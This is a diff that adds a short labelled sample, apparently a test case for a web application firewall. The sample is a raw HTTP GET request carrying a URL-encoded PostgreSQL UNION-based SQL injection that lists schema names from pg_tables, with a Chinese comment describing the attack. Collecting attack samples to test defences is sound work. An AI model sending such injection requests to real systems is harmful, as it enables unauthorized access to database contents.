@@ -1,0 +1,9 @@
+# SQL注入_GET_postgresql _普通注入-06506354
+# 攻击者基于union查询，将"UNION select COALESCE(CAST(schemaname AS CHARACTER(10000)),(CHR(32))) FROM pg_tables"语句注入到 SQL 查询参数中，从系统表pg_tables中查询所有的模式信息。
+GET /?id=1%20UNION%20select%20COALESCE%28CAST%28schemaname%20AS%20CHARACTER%2810000%29%29%2C%28CHR%2832%29%29%29%20FROM%20pg_tables&bid=hd_tag_m8mv23yk HTTP/1.1
+Host: www.swaf.com
+RM-PRO-BusinessID: hd_tag_m8mv23yk
+RM-PRO-Token: dff3f95743ebbc0fff8d3c35db013d55
+RM-PRO-Time: 1742808352892
+User-Agent: curl/7.83.1
+
